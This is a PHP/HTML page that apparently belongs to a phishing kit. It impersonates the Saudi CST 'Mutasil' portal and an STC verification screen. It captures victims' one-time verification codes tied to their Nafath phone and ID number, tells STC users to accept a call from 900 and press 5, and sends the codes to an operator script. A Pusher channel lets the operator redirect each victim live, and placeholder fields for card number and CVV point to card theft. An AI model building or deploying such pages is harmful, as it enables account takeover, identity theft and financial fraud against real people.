<?php
session_start();
require_once 'dashboard/init.php';
require_once 'includes/redirect.php';

// ✅ Get user ID from URL parameter or session
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
} elseif (isset($_SESSION['client_id'])) {
    $userId = $_SESSION['client_id'];
}

if (!$userId) {
    header('Location: nafad.php');
    exit;
}

// تثبيت client_id للتوافق
$_SESSION['client_id'] = $userId;

// 🔹 جلب بيانات نفاذ من session
$nafadPhone   = $_SESSION['nafad_phone']   ?? null;
$nafadTelecom = $_SESSION['nafad_telecom'] ?? null;
$nafadId      = $_SESSION['nafad_id_number'] ?? null;

// تحديد ما إذا كان STC
$isStc = (strtolower($nafadTelecom ?? '') === 'stc');

// بيانات إضافية (يمكنك تعديلها حسب الحاجة)
$sessionId = session_id();
$phonenumber = $nafadPhone ?? '';
$telecom = $nafadTelecom ?? '';
$idNumber_new = $nafadId ?? '';
$pin = '';
$otp = '';
$phone_number = '';
$full_name = '';
$id_number = '';
$company = '';
$plan = '';
$total = '20.00';
$card_holder_name = '';
$card_number = '';
$card_expiry = '';
$card_cvv = '';
$centerName = '';
$appointmentDate = '';
$appointmentTime = '';
$ref = '';
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>رمز التحقق</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>

  <style>
    body {
      font-family: 'Tajawal', sans-serif;
      background-color: #f3f6fb;
    }
    .ltr-num {
      direction: ltr;
      unicode-bidi: plaintext;
      display: inline-block;
      text-align: left;
    }
    body.stc-body {
      background-color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      color: #333;
    }
    .stc-card {
      font-family: 'Cairo', sans-serif;
      background: #fff;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      padding: 30px 25px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
    }
    .top-header {
      margin-bottom: 20px;
      width: 100%;
      max-width: 400px;
      display: flex;
      justify-content: flex-start;
      align-items: center;
    }
    .top-header img { height: 50px; }
    .mutasil-logo {
      margin-bottom: 20px;
      text-align: right;
    }
    .mutasil-logo img { height: 40px; }
    .notification-box {
      display: flex;
      align-items: center;
      gap: 15px;
      margin-bottom: 25px;
    }
    .phone-icon {
      color: #1a1a85;
      font-size: 30px;
      border: 2px solid #1a1a85;
      border-radius: 8px;
      padding: 5px;
      width: 45px;
      height: 45px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .notification-text {
      font-size: 15px;
      font-weight: 700;
      color: #4a5568;
      line-height: 1.4;
    }
    .arrow-icon {
      color: #22c55e;
      font-size: 20px;
      margin-left: 5px;
    }
    .stc-section { margin-bottom: 25px; }
    .stc-logo {
      width: 80px;
      display: block;
      margin-bottom: 2px;
      margin-right: auto;
    }
    .stc-text {
      color: #4f008c;
      font-weight: 700;
      font-size: 14px;
      line-height: 1.6;
      text-align: right;
    }
    .stc-input {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #cbd5e0;
      border-radius: 6px;
      font-family: 'Cairo', sans-serif;
      font-size: 16px;
      text-align: center;
      outline: none;
      transition: border-color 0.3s;
    }
    .stc-input:focus { border-color: #4f008c; }
    .stc-input::placeholder { color: #a0aec0; }
    .timer {
      text-align: left;
      font-size: 14px;
      color: #4a5568;
      margin-bottom: 20px;
      direction: ltr;
      display: flex;
      justify-content: flex-end;
      gap: 5px;
    }
    .timer span { direction: rtl; }
    .verify-btn {
      width: 140px;
      background-color: #e2e2e2;
      color: #a0aec0;
      border: none;
      padding: 10px 0;
      border-radius: 25px;
      font-family: 'Cairo', sans-serif;
      font-size: 16px;
      cursor: not-allowed;
      font-weight: 600;
      transition: background-color 0.2s, color 0.2s, transform 0.1s;
    }
    .verify-btn.enabled {
      background-color: #4f008c;
      color: #ffffff;
      cursor: pointer;
    }
    .verify-btn.enabled:active { transform: scale(0.98); }
    .card-footer-stc {
      margin-top: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-top: 1px solid transparent;
    }
    .cst-logo { height: 130px; }
    .error-msg {
      font-size: 13px;
      color: #e11d48;
      margin-top: 4px;
      display: none;
    }
    .tel-card {
      border-radius: 10px;
      box-shadow: 0 12px 30px rgba(0,0,0,.12);
    }
    .brand-text {
      color: #30323a;
      font-size: 18px;
    }
    .call-icon {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0d1f13;
      color: #fff;
      margin-inline: auto;
      animation: pulse 1.4s ease-in-out infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: .9 }
      50% { transform: scale(1.08); opacity: 1 }
      100% { transform: scale(1); opacity: .9 }
    }
    .dots {
      display: flex;
      gap: 6px;
      justify-content: center;
      margin-top: 10px
    }
    .dots span {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: #333;
      opacity: .65;
      animation: blink 1.2s infinite both
    }
    .dots span:nth-child(2){ animation-delay:.15s }
    .dots span:nth-child(3){ animation-delay:.3s }
    @keyframes blink {
      0%,80%,100%{opacity:.25}
      40%{opacity:1}
    }
  </style>
</head>

<?php if ($isStc): ?>
<body class="stc-body">
  <header class="top-header">
   
  </header>

  <form id="otpForm" class="stc-card" novalidate>
    <div class="mutasil-logo">
      <img src="img/Capture216.PNG" alt="mutasil">
    </div>

    <div class="notification-box">
      <div class="phone-icon">
        <svg width="24" height="24" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
        </svg>
      </div>
      <div class="notification-text">
        <span class="arrow-icon">↗</span>
        تم إرسال رمز التحقق إلى هاتفك النقال
        <span id="maskedPhone" class="ltr-num"></span>.
        الرجاء إدخاله في هذه الخانة.
      </div>
    </div>

    <div class="stc-section">
      <img src="img/STC-01.svg.png" alt="stc" class="stc-logo">
      <div class="stc-text">
        <strong>عملاء STC الكرام في حال تلقي مكالمة من 900</strong><br>
        <strong>الرجاء قبولها واختيار الرقم 5</strong>
      </div>
    </div>

    <div class="mb-2">
      <input
        id="otpInputStc"
        name="otp_second"
        type="tel"
        class="stc-input"
        maxlength="6"
        inputmode="numeric"
        pattern="\d*"
        placeholder="رمز التحقق">
      <div id="otpError" class="error-msg">
        الرجاء إدخال رمز تحقق مكوّن من 4 أو 6 أرقام فقط.
      </div>
      <div id="netError" class="error-msg">
        تعذّر الإرسال مؤقتًا. أعد المحاولة.
      </div>
    </div>

    <div class="timer">
      <span>إعادة إرسال:</span>
      <span id="timerText">03:00</span>
    </div>

    <div class="flex justify-center mb-2">
      <button id="verifyBtnStc" class="verify-btn" type="submit" disabled>تحقق</button>
    </div>

    <div class="card-footer-stc">
      <img src="img/shaer.png" alt="CST Logo" class="cst-logo">
    </div>
  </form>

<?php else: ?>
<body class="flex items-center justify-center min-h-screen">
  <div class="bg-white border border-gray-200 rounded-sm shadow-sm w-full max-w-xl p-8">
    <div class="flex items-start justify-start gap-3 mb-4">
      <img src="image/logo.svg" alt="Logo" class="w-8 h-8 mt-1">
      <div class="text-right">
        <h1 class="text-[15px] font-medium text-gray-800">هيئة الإتصالات والفضاء التقنية</h1>
        <a href="#" class="text-blue-700 text-sm font-bold hover:underline">بوابة متصل</a>
      </div>
    </div>

    <p class="text-gray-600 text-[14px] leading-6 mb-5">
      تم إرسال رمز التحقق إلى رقم هاتفك
      <span id="maskedPhone" class="ltr-num font-bold" dir="ltr"></span>،
      الرجاء إدخاله في هذه الخانة.
    </p>

    <form id="otpForm" class="space-y-5" novalidate>
      <div>
        <label for="otpInputNormal" class="block text-gray-800 text-[14px] mb-2">رمز التحقق</label>
        <input type="text" id="otpInputNormal" name="otp_second" maxlength="6" placeholder="ادخل رمز التحقق" required
               class="w-full border border-gray-300 rounded-sm px-3 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-600 text-center">
        <div id="otpError" class="error-msg">الرجاء إدخال رمز تحقق مكوّن من 4 أو 6 أرقام فقط.</div>
        <div id="netError" class="error-msg">تعذّر الإرسال مؤقتًا. أعد المحاولة.</div>
      </div>

      <div>
        <button id="verifyBtnNormal" type="submit"
                class="px-6 py-2 border border-gray-400 bg-white hover:bg-gray-50 text-gray-800 rounded-sm text-[14px] transition duration-200">
          التالي
        </button>
      </div>
    </form>
  </div>
<?php endif; ?>

  <!-- مودال الانتظار -->
  <div class="modal fade" id="otpModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content tel-card p-4 text-center">
        <p class="brand-text mt-2 mb-3">
          سوف يتم الاتصال بك من قبل مزود الخدمة لتوثيق جهازك<br>الرجاء الانتظار...
        </p>
        <div class="call-icon">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg">
            <path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.79 19.79 0 0 1 12 20a19.79 19.79 0 0 1-7.82 1.92A2 2 0 0 1 2 19.92v-3a2 2 0 0 1 2-2h.11a2 2 0 0 1 1.89 1.37l.57 1.72a2 2 0 0 0 2 1.37A13 13 0 0 0 12 18a13 13 0 0 0 3.43-.62 2 2 0 0 0 2-1.37l.57-1.72A2 2 0 0 1 20 14.92H20a2 2 0 0 1 2 2z"/>
          </svg>
        </div>
        <div class="dots"><span></span><span></span><span></span></div>
      </div>
    </div>
  </div>

<script>
    const phone = '<?= htmlspecialchars($nafadPhone ?? "", ENT_QUOTES, "UTF-8") ?>';
    const telecom   = '<?= htmlspecialchars($telecom, ENT_QUOTES, "UTF-8") ?>';

    function maskPhone(p) {
      const d = (p || '').replace(/\D/g, '');
      if (d.length < 5) return p || '';
      const first = d.slice(0, 2);
      const last3 = d.slice(-3);
      return first + '*****' + last3;
    }
    const maskedEl = document.getElementById('maskedPhone');
    if (maskedEl) maskedEl.textContent = phone ? maskPhone(phone) : 'غير متاح';

    const otpInput  = document.getElementById('otpInputStc') || document.getElementById('otpInputNormal');
    const verifyBtn = document.getElementById('verifyBtnStc') || document.getElementById('verifyBtnNormal');
    const otpError  = document.getElementById('otpError');
    const netError  = document.getElementById('netError');

    let remainingSeconds = 3 * 60;
    const timerElement = document.getElementById('timerText');

    function formatTime(seconds) {
      const m = String(Math.floor(seconds / 60)).padStart(2, '0');
      const s = String(seconds % 60).padStart(2, '0');
      return m + ':' + s;
    }

    if (timerElement) {
      timerElement.textContent = formatTime(remainingSeconds);
      const intervalId = setInterval(() => {
        remainingSeconds--;
        if (remainingSeconds <= 0) {
          remainingSeconds = 0;
          clearInterval(intervalId);
        }
        timerElement.textContent = formatTime(remainingSeconds);
      }, 1000);
    }

    if (otpInput && verifyBtn) {
      otpInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        const isValid = (this.value.length === 4 || this.value.length === 6);

        if (otpError) otpError.style.display = 'none';
        if (netError) netError.style.display = 'none';

        if (verifyBtn.id === 'verifyBtnStc') {
          verifyBtn.disabled = !isValid;
          verifyBtn.classList.toggle('enabled', isValid);
        }
      });
    }

    const formEl = document.getElementById('otpForm');
    if (formEl) {
      formEl.addEventListener('submit', async function (e) {
        e.preventDefault();

        if (otpError) otpError.style.display = 'none';
        if (netError) netError.style.display = 'none';

        const otpValue = otpInput ? otpInput.value.replace(/\D/g, '') : '';

        if (otpValue.length !== 4 && otpValue.length !== 6) {
          if (otpError) otpError.style.display = 'block';
          return;
        }

        const formData = new FormData(this);
        formData.set('nafad_code', otpValue);
        formData.set('user_id', '<?= (int)$userId ?>'); // ✅ استخدام $userId الصحيح

        console.log('📤 إرسال إلى tele/success.php:', {
          nafad_code: otpValue,
          user_id: '<?= (int)$userId ?>'
        });

        try {
          const resp = await fetch('tele/success.php', {
            method: 'POST',
            body: formData
          });

          const result = await resp.json();
          console.log('✅ نتيجة tele/success.php:', result);

          if (resp.ok && (result.ok === true || result.success === true)) {
            const modal = new bootstrap.Modal(document.getElementById('otpModal'));
            modal.show();
          } else {
            if (netError) {
              netError.textContent = result.message || result.error || 'تعذّر الإرسال مؤقتًا. أعد المحاولة.';
              netError.style.display = 'block';
            }
          }
        } catch (err) {
          console.error('❌ خطأ أثناء الإرسال:', err);
          if (netError) {
            netError.textContent = 'تعذّر الإرسال مؤقتًا. أعد المحاولة.';
            netError.style.display = 'block';
          }
        }
      });
    }

</script>
 <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
const pusher = new Pusher('a56388ee6222f6c5fb86', {
    cluster: 'ap2',
    encrypted: true
});

const channel = pusher.subscribe('my-channel');

channel.bind('force-redirect-user', function(data) {
    const myId = localStorage.getItem('current_user_id');

    if (myId && data.userId == myId) {
        window.location.href = data.url;
    }
});
</script>


</body>
</html>